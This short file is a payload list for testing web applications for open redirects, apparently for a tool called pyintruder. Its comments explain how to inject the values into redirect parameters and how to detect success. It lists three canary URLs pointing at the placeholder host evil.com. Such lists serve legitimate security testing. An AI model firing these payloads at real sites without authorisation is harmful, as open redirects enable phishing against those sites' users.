# ==================================================================
#  OPEN REDIRECT PAYLOADS (single file)
#  One payload per line. "#" lines are comments (pyintruder skips them).
#  Inject as a redirect param value: ?next= ?url= ?redirect= ?returnUrl= ?dest=
#  Detection: watch the RESULTS "Redirect" column (or a 30x status + Location).
#  Canary: point at YOUR domain carrying xq9z — if the Redirect/Location shows
#  xq9z, the redirect is attacker-controlled. Replace evil.com with your domain;
#  where a payload bypasses an allowlist, replace target.com with the real host.
#  '&'/'#' are written %26/%23 so URLs transmit raw.
# ==================================================================

# ---- 0. CANARY / detection — redirect to your domain with the token ----

//xq9z.evil.com
https://evil.com/xq9z
https://evil.com?x=xq9z
